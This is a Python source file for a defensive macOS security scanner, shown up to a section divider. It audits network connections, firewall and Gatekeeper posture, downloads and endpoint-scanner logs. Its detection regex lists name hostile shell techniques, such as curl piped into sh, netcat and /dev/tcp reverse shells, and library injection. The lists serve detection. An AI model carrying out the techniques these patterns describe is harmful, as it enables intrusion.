#!/usr/bin/env python3
"""
Mac Sentinel Synthesis Scanner — daily macOS security report for STANDARD
(non-admin) accounts.

No sudo, no third-party packages, no network calls. Works with the python3 that
ships with Apple's Command Line Tools (3.9+).

Commands
  python3 mac_sentinel_synthesis_scanner.py sample            Take one network snapshot (run every 15 min)
  python3 mac_sentinel_synthesis_scanner.py report [--open]   Collect everything and write the HTML dashboard
  python3 mac_sentinel_synthesis_scanner.py install           Install two user LaunchAgents (sampler + 7am report)
  python3 mac_sentinel_synthesis_scanner.py uninstall          Remove those LaunchAgents
  python3 mac_sentinel_synthesis_scanner.py rebaseline         Accept current persistence items as the new "known good"
  python3 mac_sentinel_synthesis_scanner.py demo [--out F]     Write a dashboard filled with sample data

Data lives in ~/MacSentinelSynthesisScanner (reports/, state/). Nothing ever leaves the Mac.
"""

import argparse
import datetime as dt
import glob
import hashlib
import ipaddress
import json
import os
import platform
import plistlib
import re
import shutil
import socket
import subprocess
import sys

VERSION = "1.0.0"
HOME = os.path.expanduser("~")
BASE_DIR = os.path.join(HOME, "MacSentinelSynthesisScanner")
STATE_DIR = os.path.join(BASE_DIR, "state")
REPORT_DIR = os.path.join(BASE_DIR, "reports")
SAMPLES_FILE = os.path.join(STATE_DIR, "net_samples.jsonl")
BASELINE_FILE = os.path.join(STATE_DIR, "baseline.json")
HISTORY_FILE = os.path.join(STATE_DIR, "history.json")
KNOWN_PROCS_FILE = os.path.join(STATE_DIR, "known_net_processes.json")
WINDOW_HOURS = 24

# Remote ports that are routine for a desktop Mac. Anything else gets flagged.
COMMON_PORTS = {
    20, 21, 22, 53, 80, 123, 143, 443, 465, 587, 853, 993, 995, 1194, 3478, 3479,
    4070, 5222, 5223, 5228, 8080, 8443, 19302, 19303, 19305, 51820,
}
# Ports that are strongly associated with remote shells / C2 / miners.
SUSPICIOUS_PORTS = {
    1337, 3333, 4444, 4445, 5555, 6666, 6667, 6697, 7777, 8888, 9001, 9030, 9050,
    9051, 14444, 31337, 45700,
}
# Processes that routinely listen on all interfaces for completely ordinary reasons
# (Apple Continuity/AirPlay, cloud-sync LAN discovery). Still surfaced, just as "info"
# instead of "medium", so a flood of normal listeners doesn't look like a security risk.
BENIGN_LISTENERS = {
    "rapportd", "controlcenter", "sharingd", "dropboxfileprovider",
    "dropbox", "googledrivefs", "onedrive", "coreaudiod", "mdnsresponder",
}
LARGE_UPLOAD_BYTES = 500 * 1024 * 1024  # 500 MB per day from a single process
SUSPICIOUS_PATH_PREFIXES = ("/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/folders/",
                            "/Users/Shared/", os.path.join(HOME, "Downloads") + "/")
SHELL_PATTERNS = [
    (r"(curl|wget)[^\n|]*\|\s*(ba|z)?sh", "Pipes a download straight into a shell"),
    (r"base64\s+(-d|--decode|-D)", "Decodes base64 payload"),
    (r"osascript\s+-e", "Runs inline AppleScript"),
    (r"DYLD_INSERT_LIBRARIES", "Injects a dynamic library"),
    (r"\bnc\b[^\n]*\s-e\s", "Netcat reverse shell"),
    (r"/dev/tcp/", "Bash network redirection (reverse shell)"),
    (r"python3?\s+-c\s+['\"].*(socket|exec)", "Inline Python with socket/exec"),
    (r"eval\s+\"?\$\((curl|wget)", "Evaluates remote content"),
]
LAUNCH_SUSPICIOUS = [
    (r"(^|/)(ba|z)?sh\s+-c", "Runs an inline shell command"),
    (r"osascript", "Runs AppleScript"),
    (r"(curl|wget)\s", "Downloads content at launch"),
    (r"python[0-9.]*\s+-c", "Runs inline Python"),
    (r"/\.[^/]+/", "Executable inside a hidden folder"),
]
EXEC_EXTS = {".app", ".pkg", ".mpkg", ".dmg", ".command", ".sh", ".tool", ".terminal", ".scpt", ".jar", ".py", ".iso"}


# ---------------------------------------------------------------------------
# small utilities
# ---------------------------------------------------------------------------
def now():
    return dt.datetime.now().astimezone()


def iso(t):
    return t.isoformat(timespec="seconds")


def run(cmd, timeout=30):
    """Run a command, never raise. Returns (returncode, stdout, stderr)."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors="replace")
        return p.returncode, p.stdout, p.stderr
    except FileNotFoundError:
        return 127, "", "not found"
    except subprocess.TimeoutExpired:
        return 124, "", "timed out"
    except Exception as exc:  # pragma: no cover
        return 1, "", str(exc)


def load_json(path, default):
    try:
        with open(path) as fh:
            return json.load(fh)
    except Exception:
        return default


def save_json(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + ".tmp"
    with open(tmp, "w") as fh:
        json.dump(data, fh, indent=1)
    os.replace(tmp, path)


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def mtime_iso(path):
    try:
        return iso(dt.datetime.fromtimestamp(os.path.getmtime(path)).astimezone())
    except OSError:
        return None


def finding(findings, severity, module, title, detail="", evidence=""):
    findings.append({"severity": severity, "module": module, "title": title,
                     "detail": detail, "evidence": str(evidence)[:400]})


def shorten_home(p):
    return p.replace(HOME, "~", 1) if p and p.startswith(HOME) else p


# ---------------------------------------------------------------------------
# 1. Network sampling (lsof + nettop, no root)
# ---------------------------------------------------------------------------
def parse_lsof():
    """lsof -F output is stable and machine friendly."""
    rc, out, _ = run(["lsof", "-nP", "-i", "-F", "pcPnT"], timeout=40)
    conns, listening = [], []
    pid, cmd, proto = None, None, None
    for line in out.splitlines():
        if not line:
            continue
        tag, val = line[0], line[1:]
        if tag == "p":
            pid, cmd = int(val), None
        elif tag == "c":
            cmd = val
        elif tag == "f":
            proto = None
        elif tag == "P":
            proto = val
        elif tag == "n":
            name = val
            state = ""
            conns.append({"pid": pid, "process": cmd, "proto": proto, "name": name, "state": state})
        elif tag == "T" and val.startswith("ST=") and conns:
            conns[-1]["state"] = val[3:]
    out_conns = []
    for c in conns:
        name = c["name"]
        if "->" in name:
            local, remote = name.split("->", 1)
            host, port = split_hostport(remote)
            out_conns.append({"pid": c["pid"], "process": c["process"], "proto": c["proto"],
                              "remote_ip": host, "port": port, "state": c["state"]})
        elif c["state"] == "LISTEN" or (c["proto"] == "UDP" and name.startswith("*:")):
            if c["state"] == "LISTEN":
                host, _ = split_hostport(name)
                local_only = host in ("127.0.0.1", "[::1]", "::1", "localhost")
                listening.append({"process": c["process"], "address": name, "local_only": local_only})
    return out_conns, listening


def split_hostport(s):
    s = s.strip()
    if s.startswith("["):
        host, _, port = s[1:].partition("]:")
    else:
        host, _, port = s.rpartition(":")
    try:
        return host, int(port)
    except ValueError:
        return host, 0


def parse_nettop():
    """Per-process cumulative bytes. nettop needs no root."""
    rc, out, _ = run(["nettop", "-P", "-L", "1", "-n", "-x", "-J", "bytes_in,bytes_out"], timeout=30)
    usage = {}
    for line in out.splitlines()[1:]:
        parts = line.split(",")
        if len(parts) < 4:
            continue
        name = parts[1].strip()
        if not name:
            continue
        proc = re.sub(r"\.\d+$", "", name)
        try:
            bi, bo = int(parts[2] or 0), int(parts[3] or 0)
        except ValueError:
            continue
        u = usage.setdefault(proc, [0, 0])
        u[0] += bi
        u[1] += bo
    return usage


def proc_paths(pids):
    paths = {}
    if not pids:
        return paths
    rc, out, _ = run(["ps", "-o", "pid=,comm=", "-p", ",".join(str(p) for p in pids)])
    for line in out.splitlines():
        line = line.strip()
        if not line:
            continue
        pid, _, comm = line.partition(" ")
        try:
            paths[int(pid)] = comm.strip()
        except ValueError:
            pass
    return paths


def take_sample():
    conns, listening = parse_lsof()
    usage = parse_nettop()
    paths = proc_paths(sorted({c["pid"] for c in conns if c["pid"]}))
    for c in conns:
        c["path"] = paths.get(c["pid"], "")
    sample = {"t": iso(now()), "conns": conns, "listening": listening, "usage": usage}
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(SAMPLES_FILE, "a") as fh:
        fh.write(json.dumps(sample) + "\n")
    prune_samples()
    return sample


def prune_samples(keep_hours=48):
    cutoff = now() - dt.timedelta(hours=keep_hours)
    try:
        with open(SAMPLES_FILE) as fh:
            lines = fh.readlines()
    except OSError:
        return
    kept = []
    for ln in lines:
        try:
            if dt.datetime.fromisoformat(json.loads(ln)["t"]) >= cutoff:
                kept.append(ln)
        except Exception:
            continue
    with open(SAMPLES_FILE, "w") as fh:
        fh.writelines(kept)


def is_public(ip):
    try:
        a = ipaddress.ip_address(ip.strip("[]").split("%")[0])
        return a.is_global
    except ValueError:
        return False


def collect_network(findings, status):
    take_sample()
    cutoff = now() - dt.timedelta(hours=WINDOW_HOURS)
    samples = []
    try:
        with open(SAMPLES_FILE) as fh:
            for ln in fh:
                try:
                    s = json.loads(ln)
                    if dt.datetime.fromisoformat(s["t"]) >= cutoff:
                        samples.append(s)
                except Exception:
                    continue
    except OSError:
        pass

    agg, procs, last_usage = {}, set(), {}
    usage_first, usage_last = {}, {}
    for s in samples:
        for c in s["conns"]:
            if not c.get("remote_ip"):
                continue
            key = (c["process"], c["remote_ip"], c["port"], c["proto"])
            a = agg.setdefault(key, {"process": c["process"], "path": c.get("path", ""), "remote": c["remote_ip"],
                                     "port": c["port"], "proto": c["proto"], "count": 0,
                                     "first_seen": s["t"], "last_seen": s["t"], "flags": []})
            a["count"] += 1
            a["last_seen"] = s["t"]
            procs.add(c["process"])
        for proc, (bi, bo) in s.get("usage", {}).items():
            usage_first.setdefault(proc, (bi, bo))
            usage_last[proc] = (bi, bo)

    # nettop counters are cumulative per process lifetime; use max(last-first, last) as a fair estimate
    talkers = []
    for proc, (bi, bo) in usage_last.items():
        fi, fo = usage_first.get(proc, (0, 0))
        din = bi - fi if bi >= fi and len(samples) > 1 else bi
        dout = bo - fo if bo >= fo and len(samples) > 1 else bo
        talkers.append({"process": proc, "bytes_in": din, "bytes_out": dout})
    talkers.sort(key=lambda t: t["bytes_out"] + t["bytes_in"], reverse=True)

    known = set(load_json(KNOWN_PROCS_FILE, []))
    first_run = not known
    for a in agg.values():
        path = a["path"] or ""
        if a["port"] in SUSPICIOUS_PORTS:
            a["flags"].append("Suspicious port")
            finding(findings, "high", "network", "%s connected to port %s" % (a["process"], a["port"]),
                    "This port is commonly used by remote shells, Tor or crypto miners.", "%s:%s" % (a["remote"], a["port"]))
        elif a["port"] not in COMMON_PORTS and a["port"] < 49152 and is_public(a["remote"]):
            a["flags"].append("Unusual port")
            finding(findings, "low", "network", "%s used uncommon port %s" % (a["process"], a["port"]),
                    "Often legitimate (games, VPNs, dev tools). Confirm you recognise it.", "%s:%s" % (a["remote"], a["port"]))
        if path.startswith(SUSPICIOUS_PATH_PREFIXES):
            a["flags"].append("Odd binary path")
            finding(findings, "high", "network", "Network activity from a temporary or download folder",
                    "%s is running from %s. Malware often runs from these locations." % (a["process"], shorten_home(path)),
                    shorten_home(path))
        if not first_run and a["process"] not in known:
            a["flags"].append("First time online")
    new_procs = sorted(p for p in procs if p and p not in known)
    if not first_run:
        for p in new_procs:
            finding(findings, "low", "network", "%s went online for the first time" % p,
                    "New since Mac Sentinel Synthesis Scanner started watching. Expected after installing apps.", p)
    save_json(KNOWN_PROCS_FILE, sorted(known | procs))

    for t in talkers:
        if t["bytes_out"] >= LARGE_UPLOAD_BYTES:
            finding(findings, "medium", "network", "%s uploaded %.1f GB" % (t["process"], t["bytes_out"] / 1024 ** 3),
                    "Large uploads are normal for backups and cloud sync, but are also how data is stolen.", t["process"])

    listening = samples[-1]["listening"] if samples else []
    seen_l = set()
    uniq_listen = []
    for l in listening:
        k = (l["process"], l["address"])
        if k in seen_l:
            continue
        seen_l.add(k)
        uniq_listen.append(l)
        if not l["local_only"]:
            if (l["process"] or "").lower() in BENIGN_LISTENERS:
                finding(findings, "info", "network", "%s accepts connections from the network" % l["process"],
                        "Normal for this process (Continuity/AirPlay or cloud-sync LAN discovery). No action needed.", l["address"])
            else:
                finding(findings, "medium", "network", "%s accepts connections from the network" % l["process"],
                        "Listening on all interfaces. Fine for AirPlay or dev servers you started; otherwise investigate.", l["address"])

    conns = sorted(agg.values(), key=lambda a: (-len(a["flags"]), -a["count"]))[:400]
    status["network"] = {"state": "ok" if samples else "partial",
                         "reason": "%d samples via lsof + nettop (raw packet capture needs admin)" % len(samples)}
    return {
        "samples": len(samples),
        "first_sample": samples[0]["t"] if samples else None,
        "last_sample": samples[-1]["t"] if samples else None,
        "unique_processes": len(procs),
        "unique_remotes": len({(a["remote"], a["port"]) for a in agg.values()}),
        "total_in": sum(t["bytes_in"] for t in talkers),
        "total_out": sum(t["bytes_out"] for t in talkers),
        "top_talkers": talkers[:15],
        "listening": uniq_listen,
        "connections": conns,
    }


# ---------------------------------------------------------------------------
# 2. Host Firewalls (Little Snitch & Objective-See LuLu)
# ---------------------------------------------------------------------------
LS_CANDIDATES = ["/usr/local/bin/littlesnitch", "/opt/homebrew/bin/littlesnitch",
                 "/Applications/Little Snitch.app/Contents/Components/littlesnitch"]


def app_version(app_path):
    info = os.path.join(app_path, "Contents/Info.plist")
    if os.path.exists(info):
        try:
            with open(info, "rb") as fh:
                return plistlib.load(fh).get("CFBundleShortVersionString")
        except Exception:
            pass
    return None


def collect_littlesnitch(findings, status):
    cli = shutil.which("littlesnitch") or next((p for p in LS_CANDIDATES if os.path.exists(p)), None)
    rc, ps_out, _ = run(["ps", "-axo", "comm="])
    ps_lines = [l.lower() for l in ps_out.splitlines()]
    running = any("little snitch" in l for l in ps_lines)
    ls_installed = cli is not None or os.path.exists("/Applications/Little Snitch.app")
    version = app_version("/Applications/Little Snitch.app")

    lulu_installed = os.path.exists("/Applications/LuLu.app")
    lulu_ver = app_version("/Applications/LuLu.app") if lulu_installed else None
    lulu_running = any("lulu" in l for l in ps_lines)
    lulu = {"installed": lulu_installed, "version": lulu_ver, "running": lulu_running}

    events, note = [], ""
    if cli:
        rc, out, err = run([cli, "log", "--last", "%dh" % WINDOW_HOURS, "--json"], timeout=120)
        events = parse_log_json(out)
        if rc != 0 and not events:
            note = (err.strip() or "littlesnitch log returned no data")[:200]
    elif not lulu["installed"]:
        note = "Neither Little Snitch CLI nor LuLu detected."

    # Check readable LuLu log files if present. We only know when the file was last
    # written, not the real time of each line, so skip files outside the report
    # window entirely and leave individual event times unknown rather than stamping
    # every line with the file's mtime (which would make them all look simultaneous).
    log_cutoff = now() - dt.timedelta(hours=WINDOW_HOURS)
    for lp in glob.glob(os.path.join(HOME, "Library/Logs/*LuLu*")) + glob.glob("/Library/Logs/*LuLu*"):
        if not os.access(lp, os.R_OK):
            continue
        try:
            if dt.datetime.fromtimestamp(os.path.getmtime(lp)).astimezone() < log_cutoff:
                continue
        except OSError:
            continue
        try:
            with open(lp, errors="replace") as fh:
                for ln in fh.readlines()[-200:]:
                    if ln.strip():
                        events.append({"time": None, "process": "LuLu", "message": ln.strip()[:400]})
        except OSError:
            pass

    denied = 0
    for e in events:
        m = e["message"].lower()
        e["denied"] = any(w in m for w in ("deny", "denied", "block", "reject"))
        denied += e["denied"]
    events.sort(key=lambda e: e["time"] or "", reverse=True)

    if not ls_installed and not lulu["installed"]:
        status["littlesnitch"] = {"state": "unavailable", "reason": "No third-party outbound firewall installed (Little Snitch / LuLu)"}
        finding(findings, "info", "littlesnitch", "No third-party outbound firewall detected", "Network panel still monitors sockets via lsof/nettop.")
    else:
        if ls_installed and not running:
            finding(findings, "high", "littlesnitch", "Little Snitch is installed but not running",
                    "Outbound connections are not being filtered by Little Snitch right now.", "No Little Snitch process found")
        if lulu["installed"] and not lulu["running"]:
            finding(findings, "high", "littlesnitch", "LuLu firewall is installed but not running",
                    "Objective-See LuLu is installed in /Applications but its daemon is not active.", "No LuLu process found")
        if denied:
            finding(findings, "low" if denied < 25 else "medium", "littlesnitch",
                    "Host firewall blocked %d connection events" % denied,
                    "Blocks are normal. A sudden spike can mean a background process keeps retrying.", "%d deny events" % denied)
        active_names = [n for n, r in [("Little Snitch", running), ("LuLu", lulu_running)] if r]
        ok = bool(active_names)
        reason = ("Active: %s (%d log events)" % (", ".join(active_names), len(events))) if ok else (note or "Firewall stopped")
        status["littlesnitch"] = {"state": "ok" if (ok and events) else ("partial" if ok else "unavailable"), "reason": reason}
    return {"cli_available": bool(cli), "cli_path": cli, "running": running, "version": version,
            "lulu": lulu, "events": events[:500], "denied_count": denied, "note": note}


def parse_log_json(out):
    """Handles both a JSON array and newline-delimited JSON from `log`-style output."""
    out = out.strip()
    if not out:
        return []
    items = []
    try:
        data = json.loads(out)
        items = data if isinstance(data, list) else [data]
    except ValueError:
        for ln in out.splitlines():
            ln = ln.strip().rstrip(",")
            if ln.startswith("{"):
                try:
                    items.append(json.loads(ln))
                except ValueError:
                    pass
    events = []
    for it in items:
        if not isinstance(it, dict):
            continue
        msg = it.get("eventMessage") or it.get("message") or it.get("composedMessage") or ""
        proc = it.get("processImagePath") or it.get("process") or it.get("senderImagePath") or ""
        events.append({"time": normalise_ts(it.get("timestamp") or it.get("time")),
                       "process": os.path.basename(proc) if proc else "", "message": msg[:500]})
    return events


def normalise_ts(ts):
    if not ts:
        return None
    s = str(ts).strip()
    m = re.match(r"(\d{4}-\d{2}-\d{2})[ T](\d{2}:\d{2}:\d{2})(?:\.\d+)?([+-]\d{2}:?\d{2})?", s)
    if not m:
        return s
    tz = m.group(3) or ""
    if tz and ":" not in tz:
        tz = tz[:3] + ":" + tz[3:]
    return "%sT%s%s" % (m.group(1), m.group(2), tz)


# ---------------------------------------------------------------------------
# 3. Gatekeeper / XProtect / OS posture / downloads
# ---------------------------------------------------------------------------
def collect_gatekeeper(findings, status):
    posture = []

    rc, out, err = run(["spctl", "--status"])
    gk = (out + err).strip()
    gk_ok = "enabled" in gk
    posture.append({"name": "Gatekeeper", "value": gk or "unknown", "state": "ok" if gk_ok else ("bad" if "disabled" in gk else "unknown")})
    if "disabled" in gk:
        finding(findings, "high", "gatekeeper", "Gatekeeper is turned off", "Unsigned apps can run with no warning. Ask your admin to re-enable it.", gk)

    rc, out, err = run(["csrutil", "status"])
    sip = (out + err).strip()
    posture.append({"name": "System Integrity Protection", "value": sip.replace("System Integrity Protection status: ", "") or "unknown",
                    "state": "ok" if "enabled" in sip else ("bad" if "disabled" in sip else "unknown")})
    if "disabled" in sip:
        finding(findings, "high", "gatekeeper", "System Integrity Protection is disabled", "Core macOS files are not protected.", sip)

    rc, out, err = run(["fdesetup", "status"])
    fv = (out + err).strip().splitlines()[0] if (out + err).strip() else "unknown"
    posture.append({"name": "FileVault", "value": fv, "state": "ok" if "On" in fv else ("bad" if "Off" in fv else "unknown")})
    if "FileVault is Off" in fv:
        finding(findings, "medium", "gatekeeper", "FileVault disk encryption is off", "A lost or stolen Mac would expose your files.", fv)

    rc, out, err = run(["/usr/libexec/ApplicationFirewall/socketfilterfw", "--getglobalstate"])
    fw = (out + err).strip()
    posture.append({"name": "macOS firewall", "value": fw or "unknown",
                    "state": "ok" if "enabled" in fw.lower() else ("bad" if "disabled" in fw.lower() else "unknown")})

    xp_ver, xp_date = None, None
    for xp in ["/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Info.plist",
               "/System/Library/CoreServices/XProtect.bundle/Contents/Info.plist"]:
        if os.path.exists(xp):
            try:
                with open(xp, "rb") as fh:
                    xp_ver = plistlib.load(fh).get("CFBundleShortVersionString")
                xp_date = mtime_iso(xp)
            except Exception:
                pass
            break
    stale = False
    if xp_date:
        age = (now() - dt.datetime.fromisoformat(xp_date)).days
        stale = age > 45
        if stale:
            finding(findings, "medium", "gatekeeper", "XProtect definitions are %d days old" % age,
                    "Apple normally ships updates every few weeks. Check Software Update settings.", "XProtect %s" % xp_ver)
    posture.append({"name": "XProtect definitions", "value": ("v%s · updated %s" % (xp_ver, xp_date[:10])) if xp_ver else "not readable",
                    "state": "unknown" if not xp_ver else ("bad" if stale else "ok")})

    # XProtect reports in user-readable diagnostic folder
    reports = []
    for d in [os.path.join(HOME, "Library/Logs/DiagnosticReports"), "/Library/Logs/DiagnosticReports"]:
        for p in glob.glob(os.path.join(d, "*XProtect*")):
            reports.append({"name": os.path.basename(p), "modified": mtime_iso(p)})
    reports.sort(key=lambda r: r["modified"] or "", reverse=True)
    cutoff = now() - dt.timedelta(hours=WINDOW_HOURS)
    for r in reports:
        if r["modified"] and dt.datetime.fromisoformat(r["modified"]) >= cutoff:
            finding(findings, "high", "gatekeeper", "XProtect wrote a detection report today",
                    "macOS's built-in malware scanner acted on a file. Open the report in Console.app.", r["name"])

    # Unified log (often admin-only; we try, then degrade)
    xp_log = []
    rc, out, err = run(["log", "show", "--last", "%dh" % WINDOW_HOURS, "--style", "compact", "--predicate",
                        'subsystem == "com.apple.XProtectFramework.PluginAPI" OR process == "syspolicyd" AND eventMessage CONTAINS[c] "deny"'],
                       timeout=90)
    log_ok = rc == 0
    if log_ok:
        xp_log = [l for l in out.splitlines() if l and not l.startswith("Timestamp") and not l.startswith("Filtering")][-80:]
        for l in xp_log:
            if re.search(r"(detected|remediat|malware)", l, re.I):
                finding(findings, "high", "gatekeeper", "XProtect log mentions a detection", "", l)
                break

    downloads = audit_downloads(findings)
    reason = "Posture, quarantine and signatures checked"
    if not log_ok:
        reason += "; unified log needs admin, used diagnostic reports instead"
    if downloads is None:
        downloads = []
        reason = "Downloads folder blocked: allow Terminal/Python access to Downloads"
        status["gatekeeper"] = {"state": "partial", "reason": reason}
    else:
        status["gatekeeper"] = {"state": "ok" if log_ok else "partial", "reason": reason}
    return {"posture": posture, "xprotect_reports": reports[:50], "xprotect_log": xp_log, "downloads": downloads}


def audit_downloads(findings, days=7, limit=80):
    roots = [os.path.join(HOME, "Downloads"), os.path.join(HOME, "Applications")]
    cutoff = now().timestamp() - days * 86400
    items = []
    blocked = True
    for root in roots:
        if not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
            blocked = False
        except PermissionError:
            continue
        for name in entries:
            if name.startswith("."):
                continue
            p = os.path.join(root, name)
            try:
                if os.path.getmtime(p) < cutoff:
                    continue
            except OSError:
                continue
            items.append(p)
    if blocked and any(os.path.isdir(r) for r in roots):
        return None
    items.sort(key=lambda p: os.path.getmtime(p), reverse=True)
    return [inspect_file(p, findings) for p in items[:limit]]


def inspect_file(path, findings):
    name = os.path.basename(path)
    ext = os.path.splitext(name)[1].lower()
    is_app = path.endswith(".app")
    executable = ext in EXEC_EXTS or (os.path.isfile(path) and os.access(path, os.X_OK))
    kind = "App" if is_app else (ext[1:].upper() if ext else ("Executable" if executable else "File"))

    rc, out, _ = run(["xattr", "-p", "com.apple.quarantine", path], timeout=10)
    quarantined = rc == 0 and bool(out.strip())

    where = ""
    rc, out, _ = run(["mdls", "-raw", "-name", "kMDItemWhereFroms", path], timeout=10)
    urls = re.findall(r'"([^"]+)"', out)
    if urls:
        where = urls[0][:160]

    signer, verdict = "", "document"
    if executable or is_app:
        verdict = "unknown"
        if ext in (".pkg", ".mpkg"):
            rc, out, _ = run(["pkgutil", "--check-signature", path], timeout=30)
            m = re.search(r"1\.\s+(.+)", out)
            signer = m.group(1).strip() if m else ""
            if "no signature" in out.lower():
                verdict = "unsigned"
            elif "notarized" in out.lower():
                verdict = "ok"
            elif signer:
                verdict = "signed"
        else:
            rc, out, err = run(["codesign", "-dv", "--verbose=2", path], timeout=30)
            txt = out + err
            m = re.search(r"Authority=(.+)", txt)
            signer = m.group(1).strip() if m else ""
            if "not signed" in txt:
                verdict = "unsigned"
            elif signer:
                verdict = "signed"
            if is_app or ext == ".dmg":
                args = ["spctl", "-a", "-vv", "-t", "exec", path] if is_app else \
                       ["spctl", "-a", "-vv", "-t", "open", "--context", "context:primary-signature", path]
                rc2, o2, e2 = run(args, timeout=30)
                t2 = o2 + e2
                if "accepted" in t2 and "Notarized" in t2:
                    verdict = "ok"
                elif "rejected" in t2 and verdict != "unsigned":
                    verdict = "rejected"
        if verdict == "unsigned" and not ext in (".sh", ".command", ".py", ".scpt", ".tool"):
            finding(findings, "medium", "gatekeeper", "Unsigned %s in %s" % (kind.lower(), shorten_home(os.path.dirname(path))),
                    "No developer signature. Only run it if you trust where it came from.", shorten_home(path))
        if verdict == "rejected":
            finding(findings, "medium", "gatekeeper", "Gatekeeper would block %s" % name,
                    "Not notarized by Apple. Common for open-source tools; risky otherwise.", shorten_home(path))
        if not quarantined and where:
            verdict = "stripped" if verdict != "ok" else verdict
            finding(findings, "high", "gatekeeper", "Quarantine flag removed from a downloaded %s" % kind.lower(),
                    "It came from the internet but Gatekeeper's quarantine mark is gone. Malware installers often do this.",
                    "%s ← %s" % (shorten_home(path), where))
    return {"name": name, "path": shorten_home(path), "kind": kind, "executable": executable, "quarantined": quarantined,
            "where_from": where, "signer": signer, "verdict": verdict, "modified": mtime_iso(path)}


# ---------------------------------------------------------------------------
# 4. Endpoint Scanners & Objective-See Suite
# ---------------------------------------------------------------------------
MB_PROC_RE = re.compile(
    r"malwarebytes|RTProtectionDaemon|FrontendAgent|com\.malwarebytes|mbam|"
    r"BlockBlock|OverSight|KnockKnock|RansomWhere|clamd|freshclam", re.I
)
MB_LINE_RE = re.compile(r"threat|detect|quarantin|malware(?!bytes)|pup|scan (complete|finished)|removed|alert|blocked", re.I)

ENDPOINT_CATALOG = [
    ("Malwarebytes", "/Applications/Malwarebytes.app", r"malwarebytes|RTProtectionDaemon|FrontendAgent|mbam", True),
    ("BlockBlock", "/Applications/BlockBlock Helper.app", r"BlockBlock", True),
    ("OverSight", "/Applications/OverSight.app", r"OverSight", True),
    ("KnockKnock", "/Applications/KnockKnock.app", r"KnockKnock", False),
    ("RansomWhere?", "/Library/Objective-See/RansomWhere", r"RansomWhere", True),
    ("ClamAV", "", r"clamd|freshclam", False),
]


def collect_malwarebytes(findings, status):
    app = "/Applications/Malwarebytes.app"
    installed = os.path.exists(app)
    version = app_version(app)
    rc, out, _ = run(["ps", "-axo", "pid=,comm="])
    procs = []
    all_comms = []
    for line in out.splitlines():
        line = line.strip()
        pid, _, comm = line.partition(" ")
        comm_s = comm.strip()
        all_comms.append(comm_s)
        if MB_PROC_RE.search(comm_s):
            procs.append({"pid": int(pid) if pid.isdigit() else 0, "name": shorten_home(comm_s)})

    tools = []
    for tname, tpath, pat, expects_daemon in ENDPOINT_CATALOG:
        if tname == "ClamAV":
            cbin = shutil.which("clamscan") or shutil.which("clamd") or next(
                (p for p in ("/opt/homebrew/bin/clamscan", "/usr/local/bin/clamscan") if os.path.exists(p)), None)
            t_inst = bool(cbin)
            t_ver = "CLI available" if cbin else None
        elif tname == "BlockBlock":
            alt = "/Applications/BlockBlock.app" if os.path.exists("/Applications/BlockBlock.app") else tpath
            t_inst = os.path.exists(alt) or os.path.exists("/Library/Objective-See/BlockBlock")
            t_ver = app_version(alt)
        else:
            t_inst = os.path.exists(tpath) if tpath else False
            t_ver = app_version(tpath) if tpath and tpath.endswith(".app") else None
        t_run = any(re.search(pat, c, re.I) for c in all_comms)
        if t_run:
            det = ("Running · v%s" % t_ver) if t_ver else "Daemon running"
        elif t_inst:
            det = ("Installed (v%s) · On-demand" % t_ver) if (t_ver and not expects_daemon) else "Installed · Daemon not running"
        else:
            det = "Not installed (optional)"
        tools.append({"name": tname, "installed": t_inst, "running": t_run or (t_inst and not expects_daemon), "detail": det})
        if t_inst and expects_daemon and not t_run:
            finding(findings, "high" if tname == "Malwarebytes" else "medium", "malwarebytes",
                    "%s is installed but its background monitor is not running" % tname,
                    "Open %s and verify its real-time protection or helper daemon is enabled." % tname)

    logs, lines = [], []
    roots = ["/Library/Application Support/Malwarebytes", os.path.join(HOME, "Library/Application Support/Malwarebytes"),
             "/Library/Objective-See", os.path.join(HOME, "Library/Logs"), "/Library/Logs", "/var/log"]
    cutoff = now().timestamp() - 7 * 86400
    for root in roots:
        if not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in safe_walk(root, max_depth=4):
            is_sec_dir = any(k in dirpath.lower() for k in ("malwarebytes", "objective-see", "clamav", "blockblock", "oversight"))
            for fn in filenames:
                if not (is_sec_dir or any(k in fn.lower() for k in ("malwarebytes", "blockblock", "oversight", "clamav", "ransomwhere"))):
                    continue
                if not fn.lower().endswith((".log", ".txt", ".json")):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    if os.path.getmtime(p) < cutoff or not os.access(p, os.R_OK):
                        continue
                    with open(p, errors="replace") as fh:
                        tail = fh.readlines()[-2000:]
                except OSError:
                    continue
                logs.append({"path": shorten_home(p), "modified": mtime_iso(p)})
                for l in tail:
                    if MB_LINE_RE.search(l):
                        lines.append(l.rstrip()[:300])
    lines = lines[-150:]

    any_installed = any(t["installed"] or t["running"] for t in tools)
    if not any_installed and not procs:
        status["malwarebytes"] = {"state": "unavailable", "reason": "No third-party endpoint scanners installed"}
        finding(findings, "info", "malwarebytes", "No third-party endpoint scanner detected",
                "Optional: supports Malwarebytes, Objective-See (BlockBlock, OverSight, KnockKnock), and ClamAV.")
    else:
        threat_lines = [l for l in lines if re.search(r"threat|detect|quarantin|malware(?!bytes)|pup", l, re.I)
                        and not re.search(r"\b0 (threats|detections)\b", l, re.I)]
        if threat_lines:
            finding(findings, "medium", "malwarebytes", "Endpoint logs mention threats or quarantine",
                    "Review your scanner's detection history for details.", threat_lines[-1])
        active_suites = [t["name"] for t in tools if t["installed"] or t["running"]]
        state = "ok" if logs else "partial"
        reason = ("%s (%d processes, %d readable logs)" % (", ".join(active_suites), len(procs), len(logs))) if logs else \
                 ("%s active; detailed logs are root-only" % (", ".join(active_suites) or "Process check"))
        status["malwarebytes"] = {"state": state, "reason": reason}
    return {"installed": installed, "version": version, "tools": tools, "processes": procs, "logs": logs[:40], "log_lines": lines}


def safe_walk(root, max_depth=3):
    base = root.rstrip("/").count("/")
    for dirpath, dirnames, filenames in os.walk(root, onerror=lambda e: None):
        if dirpath.count("/") - base >= max_depth:
            dirnames[:] = []
        yield dirpath, dirnames, filenames


# ---------------------------------------------------------------------------
